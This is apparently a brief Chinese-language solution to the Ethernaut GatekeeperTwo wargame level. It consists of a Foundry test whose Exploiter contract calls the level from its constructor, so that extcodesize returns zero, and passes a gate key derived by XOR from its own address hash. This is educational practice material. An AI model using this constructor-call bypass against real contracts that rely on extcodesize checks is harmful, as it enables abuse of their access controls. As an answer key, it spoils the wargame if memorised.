`extcodesize(addr)` 会返回地址的代码量，对于合约地址，这个值应该大于 0，但在构造函数运行时，`extcodesize` 的返回值为 0。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperTwo.sol";
import "src/levels/GatekeeperTwoFactory.sol";

contract TestGatekeeperTwo is BaseTest {
    GatekeeperTwo private level;

    constructor() public {
        levelFactory = new GatekeeperTwoFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperTwo(levelAddress);

        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        vm.prank(player, player);
        new Exploiter(level);
    }
}

contract Exploiter {
    address private owner;

    constructor(GatekeeperTwo level) public {
        owner = msg.sender;

        bytes8 contractByte8 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = contractByte8 ^ bytes8(type(uint64).max);

        level.enter(gateKey);
    }
}
```

